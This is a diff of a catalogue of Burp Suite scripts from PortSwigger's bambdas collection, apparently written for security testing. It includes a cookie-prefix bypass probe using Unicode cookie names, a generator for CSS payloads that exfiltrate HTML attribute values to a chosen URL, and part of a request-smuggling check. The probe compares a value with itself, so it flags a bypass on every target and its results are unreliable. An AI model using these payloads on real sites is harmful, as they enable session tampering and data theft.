@@ -89,57 +89,57 @@ for(HttpParameter parameter: testParameters) {
 ### Probe Cookie prefix bypass attack
 #### Author: d0ge
 ```java
-  if (!requestResponse.hasResponse()) return;
+if (!requestResponse.hasResponse()) return;
 
-  var req = requestResponse.request();
-  var res = requestResponse.response();
+var req = requestResponse.request();
+var res = requestResponse.response();
 
-  var map = new java.util.LinkedHashMap<String, HttpParameter>();
-  res.cookies().stream()
-     .filter(c -> c.name().startsWith("__Host-") || c.name().startsWith("__Secure-"))
-      .forEach(c -> map.put(c.name(), HttpParameter.cookieParameter(c.name(), c.value())));
-  req.parameters().stream()
-      .filter(p -> p.type() == HttpParameterType.COOKIE
-               && (p.name().startsWith("__Host-") || p.name().startsWith("__Secure-")))
-      .forEach(p -> map.put(p.name(), HttpParameter.cookieParameter(p.name(), p.value())));
+var map = new java.util.LinkedHashMap<String, HttpParameter>();
+res.cookies().stream()
+   .filter(c -> c.name().startsWith("__Host-") || c.name().startsWith("__Secure-"))
+    .forEach(c -> map.put(c.name(), HttpParameter.cookieParameter(c.name(), c.value())));
+req.parameters().stream()
+    .filter(p -> p.type() == HttpParameterType.COOKIE
+             && (p.name().startsWith("__Host-") || p.name().startsWith("__Secure-")))
+    .forEach(p -> map.put(p.name(), HttpParameter.cookieParameter(p.name(), p.value())));
 
-  var merged = new java.util.ArrayList<>(map.values());
-  if (merged.isEmpty()) {
-    logging().logToOutput("[INFO] No '__Host-' or '__Secure-' cookies found in response.");
-    return;
-  }
-  var exploit = req
-      .withRemovedParameters(merged)
-      .withAddedParameters(
-          merged.stream()
-                .map(p -> HttpParameter.cookieParameter("§§§" + p.name(), p.value()))
-                .toList()
-      );
-  var downgrade = exploit.toString().replaceFirst("HTTP/2","HTTP/1.1");
-  var prob = downgrade.replaceAll("§§§", "");
-  var prob1 = api().http().sendRequest(HttpRequest.httpRequest(req.httpService(), prob), HttpMode.HTTP_1);
-  if(!prob1.hasResponse()) {
-  	logging().logToError("[ERROR] HTTP/1.1 is not supported by the server.");
-    return;
-  }
-  var attributes1 = prob1.response().attributes(AttributeType.COOKIE_NAMES);
+var merged = new java.util.ArrayList<>(map.values());
+if (merged.isEmpty()) {
+  logging().logToOutput("[INFO] No '__Host-' or '__Secure-' cookies found in response.");
+  return;
+}
+var exploit = req
+    .withRemovedParameters(merged)
+    .withAddedParameters(
+        merged.stream()
+              .map(p -> HttpParameter.cookieParameter("§§§" + p.name(), p.value()))
+              .toList()
+    );
+var downgrade = exploit.toString().replaceFirst("HTTP/2","HTTP/1.1");
+var prob = downgrade.replaceAll("§§§", "");
+var prob1 = api().http().sendRequest(HttpRequest.httpRequest(req.httpService(), prob), HttpMode.HTTP_1);
+if(!prob1.hasResponse()) {
+	logging().logToError("[ERROR] HTTP/1.1 is not supported by the server.");
+  return;
+}
+var attributes1 = prob1.response().attributes(AttributeType.COOKIE_NAMES);
 
-  var data = ByteArray.byteArray(downgrade);
-  int idx;
-  while ((idx = data.indexOf("§§§")) != -1) {
-      data.setByte(idx,   (byte) 0xE2);
-      data.setByte(idx+1, (byte) 0x80);
-      data.setByte(idx+2, (byte) 0x80);
-  }
+var data = ByteArray.byteArray(downgrade);
+int idx;
+while ((idx = data.indexOf("§§§")) != -1) {
+    data.setByte(idx,   (byte) 0xE2);
+    data.setByte(idx+1, (byte) 0x80);
+    data.setByte(idx+2, (byte) 0x80);
+}
 
-  var respRx = api().http()
-      .sendRequest(HttpRequest.httpRequest(
-          req.httpService(), data), HttpMode.HTTP_1);
-  if (!respRx.hasResponse()) return;
-  var attributes2 = respRx.response().attributes(AttributeType.COOKIE_NAMES);
-  if(attributes1.getFirst().value() ==  attributes1.getFirst().value()) {
-    logging().logToOutput("[WARNING] Potential secure-prefix bypass detected! Check 'All issues' Tab for details.");
-    api().siteMap().add(
+var respRx = api().http()
+    .sendRequest(HttpRequest.httpRequest(
+        req.httpService(), data), HttpMode.HTTP_1);
+if (!respRx.hasResponse()) return;
+var attributes2 = respRx.response().attributes(AttributeType.COOKIE_NAMES);
+if(attributes1.getFirst().value() ==  attributes1.getFirst().value()) {
+  logging().logToOutput("[WARNING] Potential secure-prefix bypass detected! Check 'All issues' Tab for details.");
+  api().siteMap().add(
     burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
         "Cookie Prefix Bypass",
         "The server appears to be vulnerable to a <b>Unicode-based bypass</b> affecting cookies with the <b>__Host-</b> or <b>__Secure-</b> prefix. This issue exploits RFC6265bis trimming behavior, allowing an attacker to set privileged cookies using visually similar names.",
@@ -152,33 +152,34 @@ for(HttpParameter parameter: testParameters) {
         burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
         respRx
     )
+  );
+} else {
+  logging().logToOutput("[NOTICE] Response cookie headers differ — manual review recommended.");
+  logging().logToOutput("[DEBUG] Baseline response headers:");
+	logging().logToOutput(
+	    prob1.response()
+	          .headers()
+	          .stream()
+				.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
+	          .map(Object::toString)
+	          .collect(Collectors.joining("\n"))
+	);
+}
+logging().logToOutput("[DEBUG] Request cookies: ");
+logging().logToOutput(merged.stream()
+          .map(t -> t.name() + "=" + t.value())
+          .collect(Collectors.joining("\n"))
 );
-  } else {
-    logging().logToOutput("[NOTICE] Response cookie headers differ — manual review recommended.");
-    logging().logToOutput("[DEBUG] Baseline response headers:");
-  	logging().logToOutput(
-  	    prob1.response()
-  	          .headers()
-  	          .stream()
-  				.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
-  	          .map(Object::toString)
-  	          .collect(Collectors.joining("\n"))
-  	);
-  }
-  logging().logToOutput("[DEBUG] Request cookies: ");
-  logging().logToOutput(merged.stream()
-            .map(t -> t.name() + "=" + t.value())
-            .collect(Collectors.joining("\n"))
-  );
-  logging().logToOutput("[DEBUG] Attack response headers:");
-  logging().logToOutput(
-      respRx.response()
-            .headers()
-            .stream()
-  			.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
-            .map(Object::toString)
-            .collect(Collectors.joining("\n"))
-  );
+logging().logToOutput("[DEBUG] Attack response headers:");
+logging().logToOutput(
+    respRx.response()
+          .headers()
+          .stream()
+			.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
+          .map(Object::toString)
+          .collect(Collectors.joining("\n"))
+
+);
 
 ```
 ## [HackingAssistant.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/HackingAssistant.bambda)
@@ -234,13 +235,13 @@ api.logging().logToOutput(description);
 
 ```
 ## [InlineStyleAttributeStealer.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
-### This script creates some sample HTML code and inline styles to steal attribute values using only inline styles. It supports 4 parameters that are obtained via a Java input dialog. 1. Attribute - This is the attribute name you want to steal 2. Domain prefix - This is the domain you want to exfiltrate the data to. 3. Value - This is either a maximum number to exfiltrate to or a list a comma separated values 4. Default value - This is the default value that should be placed in the attribute value
+### This script creates some sample HTML code and inline styles to steal attribute values using only inline styles. It supports 4 parameters that are obtained via a Java input dialog. 1. Attribute - This is the attribute name you want to steal 2. URL prefix - This is the URL you want to exfiltrate the data to. 3. Value - This is either a maximum number to exfiltrate to or a list a comma separated values 4. Default value - This is the default value that should be placed in the attribute value
 #### Author: Gareth Heyes
 ```java
 var attribute = javax.swing.JOptionPane.showInputDialog(null, "Enter attribute you want to steal", "Attribute", javax.swing.JOptionPane.QUESTION_MESSAGE);
 if(attribute == null) return;
-var domainPrefix = javax.swing.JOptionPane.showInputDialog(null, "Enter domain you want the value sent to", "Domain", javax.swing.JOptionPane.QUESTION_MESSAGE);
-if(domainPrefix == null) return;
+var urlPrefix = javax.swing.JOptionPane.showInputDialog(null, "Enter the URL you want the value sent to", "URL", javax.swing.JOptionPane.QUESTION_MESSAGE);
+if(urlPrefix == null) return;
 var value = javax.swing.JOptionPane.showInputDialog(null, "Enter comma separated list of data or a max numeric value", "Value", javax.swing.JOptionPane.QUESTION_MESSAGE);
 if(value == null) return;
 var defaultValue = javax.swing.JOptionPane.showInputDialog(null, "Enter default value to steal", "Default value", javax.swing.JOptionPane.QUESTION_MESSAGE);
@@ -249,19 +250,19 @@ var chain = "";
 
 if(value.contains(",")) {
   var values = value.split(",");
-  chain = "url(" + domainPrefix + "/" + values[values.length-1] + ")";
+  chain = "url(" + urlPrefix + "/" + values[values.length-1] + ")";
   if(values.length < 2) return;
 
   for (var i = values.length - 2; i > 0; i--) {
-      chain = String.format("if(style(--val:\"%s\"): url(%s/%s); else: %s)", values[i], domainPrefix, values[i], chain);
+      chain = String.format("if(style(--val:\"%s\"): \"%s/%s\"; else: %s)", values[i], urlPrefix, values[i], chain);
   }
 
-  } else {
-    var maxVal = Integer.parseInt(value);
-    chain = "url(" + domainPrefix + "/" + maxVal + ")";
-    for (var i = maxVal - 1; i > 0; i--) {
-        chain = String.format("if(style(--val:\"%d\"): url(%s/%d); else: %s)", i, domainPrefix, i, chain);
-    }
+} else {
+  var maxVal = Integer.parseInt(value);
+  chain = "url(" + urlPrefix + "/" + maxVal + ")";
+  for (var i = maxVal - 1; i > 0; i--) {
+      chain = String.format("if(style(--val:\"%d\"): \"%s/%d\"; else: %s)", i, urlPrefix, i, chain);
+  }
 }
 
 var styleStr = String.format("--val: attr(%s); --steal: %s; background: image-set(var(--steal));", attribute, chain);
@@ -879,7 +880,7 @@ if (resp.hasResponse()) {
 } else {
      logging().logToOutput("Looks like smuggling");
 }
-logging().logToOutput("For further information, refer to https://portswigger.net/research/smuggling-or-pipelining");
+logging().logToOutput("For further information, refer to https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling");
 
 ```
 ## [TestHTTPTRACESupport.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/TestHTTPTRACESupport.bambda)
